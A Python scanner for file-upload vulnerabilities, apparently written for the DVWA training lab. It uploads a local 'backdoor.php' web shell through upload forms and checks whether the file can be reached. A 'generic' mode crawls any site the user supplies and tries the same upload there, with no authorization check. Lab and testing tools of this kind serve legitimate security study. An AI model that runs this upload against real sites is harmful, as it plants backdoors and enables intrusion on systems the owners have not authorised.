# DvwaFileUploadScanner.py - 修复版本
import os
import re
import json
import sys
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style, init
from datetime import datetime

init(autoreset=True)

# 统一导入，不需要动态导入
try:
    from DVWAlogin import DvwaLogin
    from crawler import VulnerabilityCrawler
except ImportError as e:
    print(f"{Fore.RED}[✗] 依赖加载失败: {e}")
    sys.exit(1)


class DvwaFileUploadScanner:
    def __init__(self, session, base_url, mode="dvwa", crawl_depth=2):
        """
        文件上传漏洞扫描器
        :param session: requests会话对象
        :param base_url: 目标网站基础URL
        :param mode: 扫描模式 - "dvwa" 或 "generic"
        :param crawl_depth: 通用模式下的爬取深度，默认2
        """
        self.session = session
        self.base_url = base_url.rstrip("/ ")
        self.mode = mode
        self.crawl_depth = crawl_depth

        # 根据模式设置默认上传路径
        if mode == "dvwa":
            self.upload_url = urljoin(self.base_url, "vulnerabilities/upload/")
            self.upload_dir = urljoin(self.base_url, "hackable/uploads/")
        else:
            self.upload_url = None
            # 通用模式下不预设upload_dir，在扫描时动态推断

        # 创建报告目录
        self.report_dir = os.path.join("scan_result", "DvwaFileUploadScanner")
        os.makedirs(self.report_dir, exist_ok=True)

    def extract_filename(self, response_text):
        """从响应中提取上传后的文件名"""
        patterns = [
            r"hackable/uploads/([^\s'\"<]+)",
            r'<pre>.*?hackable/uploads/([^<]+?)\s+succ?esfully',
        ]

        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                filename = os.path.basename(match.group(1))
                print(f"{Fore.CYAN}[→] 从响应中提取到文件名: {filename}")
                return filename

        print(f"{Fore.YELLOW}[!] 无法自动提取文件名，使用默认值: uploaded_shell.php")
        return "uploaded_shell.php"

    def scan_upload_point(self, upload_url, form_data, file_field_name):
        """
        扫描单个文件上传点
        :return: (是否漏洞存在, 上传文件URL, 消息)
        """
        print(f"\n{Fore.BLUE}{'=' * 60}")
        print(f"{Fore.BLUE}开始扫描上传点: {upload_url}")
        print(f"{Fore.BLUE}{'=' * 60}")

        # 准备测试文件
        shell_path = os.path.join("config", "backdoor.php")
        if not os.path.isfile(shell_path):
            error_msg = f"测试文件不存在: {shell_path}"
            print(f"{Fore.RED}[✗] {error_msg}")
            return False, "", error_msg

        print(f"{Fore.CYAN}[→] 准备上传测试文件: {os.path.basename(shell_path)}")
        try:
            files = {
                file_field_name: ("backdoor.php", open(shell_path, "rb"), "application/octet-stream")
            }
        except Exception as e:
            error_msg = f"无法读取测试文件: {e}"
            print(f"{Fore.RED}[✗] {error_msg}")
            return False, "", error_msg

        try:
            # 执行上传
            print(f"{Fore.CYAN}[→] 正在发送上传请求...")
            response = self.session.post(upload_url, files=files, data=form_data)

            if response.status_code != 200:
                error_msg = f"上传请求失败，状态码: {response.status_code}"
                print(f"{Fore.RED}[✗] {error_msg}")
                return False, "", error_msg

            print(f"{Fore.GREEN}[✓] 上传请求成功，状态码: {response.status_code}")

            # 检查上传是否成功
            success_indicators = ["uploaded", "success", "完成", "成功"]
            upload_success = any(indicator in response.text.lower() for indicator in success_indicators)

            if upload_success:
                print(f"{Fore.GREEN}[✓] 服务器返回上传成功提示")
            else:
                print(f"{Fore.YELLOW}[!] 服务器响应中未找到明确的上传成功提示，继续验证...")

            # 提取文件名
            uploaded_name = self.extract_filename(response.text)

            # 推断上传目录（通用模式）
            if self.mode == "generic":
                # 更合理的推断：使用上传页面的同级目录
                parsed = urlparse(upload_url)
                # 取上传页面URL的目录路径
                upload_page_dir = f"{parsed.scheme}://{parsed.netloc}{parsed.path.rsplit('/', 1)[0]}/"
                self.upload_dir = upload_page_dir

            file_url = urljoin(self.upload_dir, uploaded_name)
            print(f"{Fore.CYAN}[→] 推断上传文件访问地址: {file_url}")

            # 验证文件是否可访问
            print(f"{Fore.CYAN}[→] 正在验证上传文件是否可访问...")
            verify = self.session.get(file_url)

            if verify.status_code == 200:
                print(f"{Fore.GREEN}[✓] 文件可访问！状态码: {verify.status_code}")
                print(f"{Fore.MAGENTA}{Style.BRIGHT}╔══════════════════════════════════════════════════════╗")
                print(f"{Fore.MAGENTA}{Style.BRIGHT}║  [!!] 发现文件上传漏洞！文件可直接访问              ║")
                print(
                    f"{Fore.MAGENTA}{Style.BRIGHT}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                return True, file_url, "文件上传漏洞存在，可访问上传文件"
            else:
                print(f"{Fore.YELLOW}[!] 文件访问失败，状态码: {verify.status_code}")
                print(f"{Fore.YELLOW}[i] 可能原因: 1) 路径推断错误 2) 文件被重命名 3) 权限限制")
                return False, file_url, "文件上传成功，但无法访问上传文件"

        except Exception as e:
            error_msg = f"扫描过程中发生异常: {e}"
            print(f"{Fore.RED}[✗] {error_msg}")
            return False, "", error_msg
        finally:
            # 确保文件被关闭
            if 'files' in locals():
                files[file_field_name][1].close()

    def save_report(self, vulnerable, target_url, message, details=None):
        """保存扫描报告"""
        current_time = datetime.now()
        report_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
        file_time = current_time.strftime("%Y-%m-%d_%H-%M-%S")

        report = {
            "target": target_url,
            "mode": self.mode,
            "vulnerable": vulnerable,
            "message": message,
            "scan_time": report_time,
            "details": details or {}
        }

        report_filename = f"report_{file_time}.json"
        report_path = os.path.join(self.report_dir, report_filename)

        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=4, ensure_ascii=False)

        # 控制台最终总结
        print(f"\n{Fore.BLUE}{'=' * 60}")
        print(f"{Fore.BLUE}扫描总结")
        print(f"{Fore.BLUE}{'=' * 60}")
        if vulnerable:
            print(f"{Fore.RED}{Style.BRIGHT}[!!] 漏洞状态: 存在高危漏洞{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[ok] 漏洞状态: 未发现问题")
        print(f"{Fore.CYAN}[i] 详细报告已保存: {report_path}")
        print(f"{Fore.BLUE}{'=' * 60}\n")

    def detect(self, crawl_results=None):
        """
        主检测方法
        :param crawl_results: 爬虫结果列表，格式为 crawler.py 中的 upload_forms
        """
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}文件上传漏洞扫描器启动")
        print(f"{Fore.CYAN}目标: {self.base_url}")
        print(f"{Fore.CYAN}模式: {self.mode.upper()}")
        print(f"{Fore.CYAN}{'=' * 60}")

        if self.mode == "dvwa":
            print(f"{Fore.CYAN}[i] DVWA模式: 使用内置固定路径")
            self._scan_dvwa_fixed()

        else:
            # 通用模式：处理爬虫结果
            if crawl_results is None:
                print(f"{Fore.CYAN}[i] 未提供爬虫结果，正在自动爬取...")
                print(f"{Fore.CYAN}[i] 爬取深度: {self.crawl_depth}\n")

                crawler = VulnerabilityCrawler(self.base_url, max_depth=self.crawl_depth)
                crawler.crawl(self.base_url)

                all_results = crawler.get_results()
                crawl_results = all_results.get('upload_forms', [])

                if not crawl_results:
                    print(f"{Fore.YELLOW}[!] 未在网站中发现任何文件上传表单")
                    return

                print(f"\n{Fore.GREEN}[✓] 自动爬取完成，发现 {len(crawl_results)} 个上传表单")

            else:
                print(f"{Fore.CYAN}[i] 使用提供的爬虫结果 ({len(crawl_results)} 个表单)")

            # 扫描每个上传点
            print(f"\n{Fore.GREEN}[i] 开始扫描 {len(crawl_results)} 个上传表单...\n")

            for idx, upload_form in enumerate(crawl_results, 1):
                print(f"{Fore.BLUE}{'─' * 60}")
                print(f"{Fore.BLUE}进度: [{idx}/{len(crawl_results)}]")

                # 安全检查：确保必要字段存在
                if 'url' not in upload_form or 'file_field' not in upload_form:
                    print(f"{Fore.YELLOW}[!] 表单信息不完整，跳过: {upload_form}")
                    continue

                vulnerable, file_url, message = self.scan_upload_point(
                    upload_form['url'],
                    upload_form.get('form_data', {}),
                    upload_form['file_field']
                )

                self.save_report(
                    vulnerable,
                    upload_form['url'],
                    message,
                    {"file_url": file_url, "form_data": upload_form}
                )

    def _scan_dvwa_fixed(self):
        """DVWA专用扫描逻辑"""
        print(f"{Fore.CYAN}[i] 目标上传页面: {self.upload_url}")
        print(f"{Fore.CYAN}[i] 预期上传目录: {self.upload_dir}")

        form_data = {"Upload": "Upload"}
        vulnerable, file_url, message = self.scan_upload_point(
            self.upload_url,
            form_data,
            "uploaded"
        )
        self.save_report(vulnerable, self.upload_url, message, {"file_url": file_url})


def main():
    """交互式主函数"""
    print("=" * 60)
    print("    文件上传漏洞扫描程序")
    print("=" * 60)

    print("\n选择目标类型:")
    print("1. DVWA (内置固定路径)")
    print("2. 其他网站 (自动爬取)")

    choice = input("\n请输入选项 (1/2): ").strip()

    if choice == "1":
        # DVWA模式
        url = input("请输入 DVWA 首页 URL: ").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL 不能为空")
            return

        print(f"{Fore.CYAN}[i] 正在登录 DVWA...")
        dvwa = DvwaLogin()
        if not dvwa.login(url):
            print(f"{Fore.RED}[✗] DVWA 登录失败")
            return

        print(f"{Fore.GREEN}[✓] DVWA 登录成功")
        session_info = dvwa.get_session_info()

        scanner = DvwaFileUploadScanner(session_info['session'], session_info['base_url'], mode="dvwa")
        scanner.detect()

    elif choice == "2":
        # 通用模式 - 自动爬取
        url = input("请输入目标网站 URL: ").strip()
        depth_input = input("请输入爬取深度 (默认2): ").strip()
        crawl_depth = int(depth_input) if depth_input.isdigit() else 2

        print(f"\n{Fore.CYAN}[i] 初始化通用模式...")
        import requests

        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})

        scanner = DvwaFileUploadScanner(session, url, mode="generic", crawl_depth=crawl_depth)
        scanner.detect()  # 自动调用爬虫

    else:
        print(f"{Fore.RED}[✗] 无效选项")


if __name__ == "__main__":
    main()